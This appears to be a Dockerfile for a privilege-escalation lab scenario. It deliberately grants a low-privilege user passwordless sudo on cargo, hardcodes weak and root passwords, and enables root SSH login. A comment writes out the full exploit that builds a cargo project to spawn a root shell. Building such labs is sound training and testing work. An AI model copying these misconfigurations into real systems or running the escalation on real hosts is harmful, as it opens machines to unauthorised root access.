FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_cargo
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/cargo as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and cargo (Rust package manager)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        cargo \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify cargo is installed
RUN which cargo && ls -la /usr/bin/cargo

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# cargo can be used to execute arbitrary commands when run as root.
# GTFOBins exploit:
#   TF=$(mktemp -d)
#   echo '[package]' > $TF/Cargo.toml
#   echo 'name = "pwn"' >> $TF/Cargo.toml
#   echo 'version = "0.1.0"' >> $TF/Cargo.toml
#   mkdir -p $TF/src
#   echo 'fn main() { std::process::Command::new("/bin/bash").status().unwrap(); }' > $TF/src/main.rs
#   sudo cargo run --manifest-path $TF/Cargo.toml
# This spawns a root shell via cargo's build-and-run functionality.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/cargo" > /etc/sudoers.d/cargo && \
    chmod 440 /etc/sudoers.d/cargo

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]